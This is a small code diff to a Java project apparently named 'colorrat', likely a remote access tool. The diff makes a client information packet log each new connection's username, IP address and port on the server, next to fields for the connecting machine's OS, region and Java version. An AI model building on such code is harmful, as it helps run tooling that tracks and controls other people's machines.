@@ -1,5 +1,6 @@
 package eu.aragonapp.colorrat.network.packet.types.client;
 
+import eu.aragonapp.colorrat.ColorServer;
 import eu.aragonapp.colorrat.network.NetworkConnection;
 import eu.aragonapp.colorrat.network.packet.Packet;
 
@@ -19,7 +20,9 @@ public class C01PacketInformations extends Packet {
     private String javaVersion, region, username, os;
 
     @Override
-    public void execute(NetworkConnection connection) { }
+    public void execute(NetworkConnection connection) {
+        ColorServer.getLogger().info("A new connection! (@\033[4;1m" + this.username.toLowerCase() + "\033[0m/" + connection.getSocket().getInetAddress().getHostAddress() + ":" + connection.getSocket().getPort() + ")");
+    }
 
     public String getJavaVersion() {
         return this.javaVersion;
